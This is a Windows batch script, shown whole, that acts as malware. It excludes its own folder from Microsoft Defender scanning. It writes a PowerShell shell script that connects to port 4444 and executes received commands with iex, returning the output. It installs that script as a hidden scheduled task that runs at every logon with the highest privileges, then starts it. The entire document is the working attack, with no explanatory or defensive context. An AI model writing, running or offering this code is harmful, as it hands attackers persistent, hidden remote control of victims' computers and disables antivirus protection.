@echo off
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%CD%' -ErrorAction SilentlyContinue"
echo while(true){$client = (New-Object System.Net.Sockets.TcpClient('0.0.0.0',4444)).GetStream();[byte[]]$bytes = 0..65535 ^| ^%{0};while(($i = $client.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 ^| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII)^.GetBytes($sendback2);$client.Write($sendbyte,0,$sendbyte.Length);$client.Flush()};$client.Close()} > bind.ps1
schtasks /create /tn "BindShell" /tr "powershell -w hidden -f bind.ps1" /sc onlogon /rl highest /f
schtasks /run /tn "BindShell"
